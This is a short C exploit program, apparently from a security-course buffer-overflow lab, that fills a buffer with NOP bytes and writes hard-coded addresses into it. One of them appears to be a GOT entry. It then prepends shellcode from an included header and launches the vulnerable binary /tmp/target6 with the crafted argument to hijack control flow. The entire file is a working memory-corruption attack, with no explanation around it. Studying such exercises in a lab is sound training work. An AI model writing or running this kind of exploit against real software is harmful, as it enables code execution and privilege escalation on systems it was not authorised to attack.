#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target6"

int main(void)
{
  char sploitstring[201];
  memset(sploitstring, '\x90', sizeof(sploitstring));
  sploitstring[200] = 0;
  int offset = 0xbffffd00 - 0xbffffcc0;
  *(int *) (sploitstring + offset - 4) = 0x0804a00c;
  *(int *) (sploitstring + offset - 8) = 0xbffffcc0;

  memcpy(sploitstring, shellcode, strlen(shellcode));

  char *args[] = { TARGET, sploitstring, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
